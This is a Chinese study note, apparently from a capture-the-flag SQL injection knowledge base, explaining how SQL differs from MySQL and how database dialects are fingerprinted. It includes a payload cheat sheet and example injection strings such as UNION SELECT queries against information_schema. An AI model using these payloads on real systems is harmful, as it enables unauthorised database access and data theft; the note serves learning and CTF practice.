---
title: MySQL 基础：SQL 与 MySQL 的区别
category: SQL注入/基础
tags: [MySQL, SQL, 关系型数据库, DBMS, 数据库指纹]
source: luvvvv 学习笔记《MYSQL》
order: 3
---

## 一句话概括

**SQL 是一门语言，MySQL 是一个实现了这门语言的软件。** MySQL 是最流行、最常用的关系型数据库管理系统之一，核心职责是高效、安全地存储、管理和提取数据。

## 原理

### 1. 从名字和背景理解

- **My**：取自联合创始人 **Michael Widenius** 的女儿的名字 "My"。
- **SQL**：代表它使用的语言是 **Structured Query Language（结构化查询语言）**，也就是 `SQL基础语法` 里讨论的那门语言。

所以，**MySQL 就是一个用 SQL 语言来管理数据库的软件**。

### 2. MySQL 与 SQL 的关系

这是一个非常重要的区别：

- **SQL** 是一种**语言**，是与数据库沟通的**标准语法和命令**（如 `SELECT`、`INSERT`、`UPDATE`）。
- **MySQL** 是一个**软件**，是**实现了 SQL 标准并提供了额外功能**的**数据库管理系统（DBMS）**。

**类比：**

- **SQL** 就像是**英语的语法和单词**；
- **MySQL** 就像是**一个说英语的、非常能干的图书管理员**。

你也可以用同样的 SQL 语法去和其它"说 SQL 语言的图书管理员"交流，比如 **PostgreSQL、Microsoft SQL Server、Oracle Database** —— 它们是不同的数据库软件，但核心语言都是 SQL。

### 3. 为什么"语言 vs 软件"的区分对注入很重要

既然大家"说的都是 SQL"，那是不是一套 payload 打遍天下？不是。原因在于**各方在标准之外还有自己的方言和自有设施**，而注入恰恰要依赖这些方言：

| 差异点 | MySQL | SQL Server | Oracle | SQLite |
|---|---|---|---|---|
| 单独用的注释符 | `#`（还有 `-- `） | `--` | `--` | `--` |
| 字符串连接 | `concat()` | `+` | `\|\|` | `\|\|` |
| 存放元数据的系统对象 | `information_schema` | `information_schema` / `sysobjects` | `all_tables` 等视图 | `sqlite_master` |
| 取当前库 | `database()` | `db_name()` | — | — |
| 取当前用户 | `user()` / `current_user()` | `suser_name()` | `user` | — |
| 是否有必须的"虚表" | 不需要 | 不需要 | `SELECT` 必须 `FROM dual` | 不需要 |
| 执行系统命令 | 一般靠 UDF | `xp_cmdshell` | 靠 Java/PLSQL 等 | 无内置 |

**同一个目标（比如"注释掉后续 SQL"），在不同数据库上写法不同**；而"爆表名"这件事，在 MySQL 上是查 `information_schema.tables`，在 SQLite 上却要查 `sqlite_master`。

所以做题时**第一步往往是判断后端到底是哪种数据库**，判断依据通常就是上面这些差异——例如报错信息的措辞、`#` 能不能当注释用、`||` 能不能拼接字符串。

## 利用条件

- **有报错或回显**：判断数据库类型最省事的办法就是看报错文案（"You have an error in your SQL syntax" 是 MySQL 的典型措辞）或试探方言函数；
- **能控制注入点的表达式上下文**：`version()`、`database()` 这类函数要能放进 `WHERE` 或 `SELECT` 的位置才会被求值；
- **知道"没有回显"时怎么办**：方言差异也可以用作**布尔/时间盲注的判断条件**（例如某个函数在 MySQL 上合法、在别处报错，就能用一个 `if()` 把差异放大成真假）。

## Payload 速查

| 目的 | Payload |
|---|---|
| 判断是不是 MySQL | 试 `#` 作注释；试 `select version()`、`select @@version` |
| 版本 | `SELECT version()` / `SELECT @@version` |
| 当前库 | `SELECT database()` |
| 当前用户 | `SELECT user()` / `SELECT current_user()` |
| 数据库存放目录 | `SELECT @@datadir` |
| 系统库 | `information_schema`（`tables` / `columns` / `schemata`） |
| 拼接字符串 | `concat('a','b')` / `group_concat(列名)` |
| 截取字符串 | `substring(s,1,1)` / `substr()` / `mid()` / `left()` / `right()` |
| 字符转 ASCII | `ascii('a')` / `ord('a')` |
| 注释 | `#` 、`-- `（注意 `--` 后要跟空白）、`/* ... */` |
| 判断列数 | `ORDER BY n` 递增至报错；或 `UNION SELECT 1,2,3...` |

## 完整示例：判断后端是不是 MySQL

```sql
-- 1) 扔一个语法错误，看报错措辞
' AND 1=1              -- 正常
' AND 1=1'             -- 触发 "You have an error in your SQL syntax ... near ..."

-- 2) 试 MySQL 特有的注释符
1' #                   -- 若后续报错消失，说明 # 生效 → 很可能是 MySQL
1' -- 空格             -- 同理

-- 3) 试 MySQL 特有的函数
' UNION SELECT 1, version(), 3 --      -- 直接回显 MySQL 版本号
' AND database() LIKE 'se%' --         -- 用当前库名首字母做布尔判断

-- 4) 确认系统库可用
' UNION SELECT 1, table_name, 3 FROM information_schema.tables LIMIT 1 --
```

## 踩坑与备注

- **原文把 MySQL 定位为"一个基于 SQL 语言的、开源的关系型数据库管理软件"**——"开源"和"关系型"是两个关键词，前者解释了它为何在 Web 后端如此普及（因而也是注入题最常见的后端），后者解释了"表与表可以通过公共字段关联"这一前提（见 `SQL基础语法`）。
- **上表中的"数据库指纹"部分是本次为把原文讲通而补充的通用知识**，原文只写到"MySQL 与 SQL 的关系"这一层。补充的目的是回答"既然都是 SQL，为什么还要区分"——不同产品的**方言**决定了 payload 能不能用。若与具体题目的实际行为冲突，**以题目实测为准**。
- **`@@version` 与 `version()` 都能取版本**，但用法的自由度不同：前者是系统变量、后者是函数，在某些被过滤的场景下一个被拦另一个还能用。
- **Oracle 的 `FROM dual` 是硬性要求**：Oracle 里 `SELECT` 必须有 `FROM`，所以哪怕是 `SELECT 1` 也得写成 `SELECT 1 FROM dual`。这一点在跨数据库迁移 payload 时最容易翻车。
- 想继续往下看 MySQL 服务端内部是怎么处理一条语句的，见 `MySQL核心原理`。
